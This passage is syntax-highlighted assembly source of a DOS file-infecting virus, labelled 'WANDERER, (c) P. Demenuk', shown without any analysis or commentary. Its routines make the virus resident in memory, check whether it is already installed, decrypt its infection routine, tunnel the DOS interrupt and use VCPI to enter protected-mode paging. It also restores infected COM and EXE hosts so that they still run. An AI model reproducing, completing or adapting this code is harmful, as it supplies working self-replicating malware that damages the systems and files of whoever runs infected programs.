</span><span class="sc1">; Selectors :</span><span class="sc0">
</span><span class="sc5">CODE_SEL</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; CS Selector</span><span class="sc0">
</span><span class="sc5">DATACS_SEL</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; CS Alias Selector</span><span class="sc0">
</span><span class="sc5">ALLMEM_SEL</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">18h</span><span class="sc0">     </span><span class="sc1">; 4GB Memory Selector</span><span class="sc0">
</span><span class="sc5">TSS_SEL</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">28h</span><span class="sc0">     </span><span class="sc1">; TSS Selector</span><span class="sc0">
</span><span class="sc5">VCPICS_SEL</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">30h</span><span class="sc0">     </span><span class="sc1">; VCPI CS Selector</span><span class="sc0">

</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">STACK_SIZE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">44h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_delta</span><span class="sc0">
</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Get delta offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">mem_mcb</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">copy_code</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0A4F2h</span><span class="sc0">    </span><span class="sc1">; Encode 'repnz movsb'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0C361h</span><span class="sc0">  </span><span class="sc1">; Encode 'popa ; ret'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">   
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc12">'WANDERER,(c) P. Demenuk'</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc5">mem_mcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ES:=MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get number of paragraphs in this MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">size_mcb</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ES:=PSP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">alloc_mem</span><span class="sc0">

</span><span class="sc5">free_mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">size_mcb</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">         </span><span class="sc1">; 600h*16 = 24576 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Adjust memory block size</span><span class="sc0">
                                        </span><span class="sc1">; ES = segment addr of block to change</span><span class="sc0">
                    </span><span class="sc1">; BX = new size in paragraphs</span><span class="sc0">
</span><span class="sc5">alloc_mem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">500h</span><span class="sc0">         </span><span class="sc1">; 500h*16 = 20480 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Allocate memory</span><span class="sc0">
                                        </span><span class="sc1">; BX = 16-byte paragraphs desired</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">free_mem</span><span class="sc0">        </span><span class="sc1">; Error? then jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2048</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">codesegment</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Copy 4K to allocated memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_mem_pos</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">; Jump to new copy</span><span class="sc0">

</span><span class="sc5">new_mem_pos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">host_type</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; COM file?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">check_resident</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Get PSP address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ES:=environment</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">           </span><span class="sc1">; Search for '1h' (file path)</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Current file path</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Open file (read)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; BX := handle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filesize_l</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">filesize_h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Lseek end of original file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">size_in_file</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Read from file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ofs_relocitems</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Lseek start of relocation table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_items</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; x2 (number of bytes in reloc. table)</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Read relocation table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Close file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_items</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">no_reloc_items</span><span class="sc0">  </span><span class="sc1">; Any relocation item? No? then jmp</span><span class="sc0">
</span><span class="sc5">l_reloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Relocate item in memory</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_reloc</span><span class="sc0">
</span><span class="sc5">no_reloc_items</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">psp_seg</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">check_resident</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3567h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Get int 67h vector</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc12">'ME'</span><span class="sc0"> </span><span class="sc1">; EMM386 loaded?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exec_host</span><span class="sc0">       </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BABAh</span><span class="sc0">       </span><span class="sc1">; Residency check</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FA00h</span><span class="sc0">       </span><span class="sc1">; Already resident?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">go_resident</span><span class="sc0">     </span><span class="sc1">; No? then jmp</span><span class="sc0">
</span><span class="sc5">free_virmem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">exec_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Free memory</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">host_type</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; COM file?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exec_com</span><span class="sc0">        </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">psp_seg</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">file_reloCS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; CS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">file_exeIP</span><span class="sc0">   </span><span class="sc1">; IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">psp_seg</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_mcb</span><span class="sc0">

</span><span class="sc5">exec_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">       </span><span class="sc1">; Set stack pointer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">; IP</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">   
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">filesize_l</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; Is the virus dropper?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_program</span><span class="sc0">    </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; End of original file</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">codesegment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">codesegment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">copy_code</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">size_in_file</span><span class="sc0">
</span><span class="sc5">restore_mcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">size_mcb</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Restore MCB size</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">            </span><span class="sc1">; Restore original code and return to host</span><span class="sc0">

</span><span class="sc5">exit_program</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Exit program</span><span class="sc0">

</span><span class="sc5">go_resident</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_infection_routine</span><span class="sc0">       </span><span class="sc1">; Decrypt</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tunnel_i21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DE00h</span><span class="sc0">       </span><span class="sc1">; VCPI installation check</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VCPI</span><span class="sc0">            </span><span class="sc1">; Doesn't return if not installed</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">saved_sp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">saved_ss</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">pages_4K</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Allocate 4 pages (4K per page)</span><span class="sc0">
</span><span class="sc5">l_alloc_page</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DE04h</span><span class="sc0">       </span><span class="sc1">; VCPI - Allocate a 4K page</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VCPI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; EDX = physical address of page</span><span class="sc0">
        </span><span class="sc6">scasd</span><span class="sc0">                   </span><span class="sc1">; == add di,4</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_alloc_page</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Align data area on page</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; Base address of directory page</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">addr_dir_page</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc2">4096</span><span class="sc4">+</span><span class="sc2">4096</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; 2 pages</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Clear directory page area (4K)</span><span class="sc0">
                                        </span><span class="sc1">;  and page table (4K)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DE01h</span><span class="sc0">       </span><span class="sc1">; VCPI - Get Protected Mode Interface</span><span class="sc0">
                    </span><span class="sc1">;  ES:DI -&gt; 4K page table buffer</span><span class="sc0">
                    </span><span class="sc1">;  DS:SI -&gt; three descriptor table</span><span class="sc0">
                    </span><span class="sc1">;           entries in GDT. First</span><span class="sc0">
                    </span><span class="sc1">;           becomes code segment</span><span class="sc0">
                    </span><span class="sc1">;           descriptor, other two for</span><span class="sc0">
                    </span><span class="sc1">;           use by main control prog.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; DS := segment of dir page table</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc0">              </span><span class="sc1">; add 100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; ES := segment of page table</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc4">+</span><span class="sc5">VCPICS_SEL</span><span class="sc0">      </span><span class="sc1">; GDT in page table + 100h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VCPI</span><span class="sc0">
